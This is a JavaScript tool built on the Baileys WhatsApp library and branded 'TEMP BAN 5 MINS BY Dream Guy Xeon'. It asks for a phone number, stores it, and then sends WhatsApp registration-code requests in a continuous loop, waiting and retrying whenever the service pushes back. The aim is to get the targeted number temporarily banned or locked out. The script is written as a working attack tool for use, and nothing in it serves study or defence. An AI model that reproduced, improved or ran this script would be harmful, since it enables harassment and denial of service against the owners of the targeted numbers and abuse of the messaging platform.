const prompt = require('prompt-sync')();
const gradient = require('gradient-string');
const pino = require('pino');
const fs = require('fs')

const { default: makeWaSocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');
const numbers = JSON.parse(fs.readFileSync('./tempban.json'));
const start = async () => {
  const { state, saveCreds } = await useMultiFileAuthState('session')
  const spam = makeWaSocket({
    auth: state,
    mobile: true,
    logger: pino({ level: 'silent' })
  })
  const dropNumber = async (context) => {
    const { phoneNumber, ccode, number } = context;
    while (true) {
      try {
      console.clear();
  console.log(gradient('black', 'black')('■'))
  console.log(gradient('black', 'black')('■'))
  console.log(gradient('black', 'black')('■'))
  console.log(gradient('black', 'black')('■'))
  console.log(gradient('Cyan', 'Cyan')('         TEMP BAN 5 MINS BY 🦄Dream Guy Xeon'))
  console.log(gradient('black', 'black')('■'))
  console.log(gradient('black', 'black')('■'))
  console.log(gradient('black', 'black')('■'))
  console.log(gradient('black', 'black')('■'))
      console.log(gradient('pink', 'green')('        Sending temporary ban to: +' + ccode + number))
        res = await spam.requestRegistrationCode({
          phoneNumber: '+' + phoneNumber,
          phoneNumberCountryCode: ccode,
          phoneNumberNationalNumber: number,
          phoneNumberMobileCountryCode: 724
        })
        b = (res.reason === 'temporarily_unavailable');
        if (b) {
          setTimeout(async () => {
            dropNumber(context)
          }, res.retry_after * 100)
          return;
        }
      } catch (error) {
      }
    }

  }
  console.clear();
  console.log(gradient('black', 'black')('■'))
  console.log(gradient('black', 'black')('■'))
  console.log(gradient('black', 'black')('■'))
  console.log(gradient('black', 'black')('■'))
  console.log(gradient('Cyan', 'Cyan')('         TEMP BAN 5 MINS BY 🦄Dream Guy Xeon'))
  console.log(gradient('black', 'black')('■'))
  console.log(gradient('black', 'black')('■'))
  console.log(gradient('black', 'black')('■'))
  console.log(gradient('black', 'black')('■'))
  let ccode = prompt(gradient('pink', 'green')('🦴 Enter the country code: '));
  let number = prompt(gradient('pink', 'green')('🦴 Enter your number: '))
  let phoneNumber = ccode + number;
  numbers[phoneNumber] = { ccode, number }
  fs.writeFileSync('./tempban.json', JSON.stringify(numbers, null, '\t'));
  dropNumber({ phoneNumber, ccode, number })
console.clear();
}
start();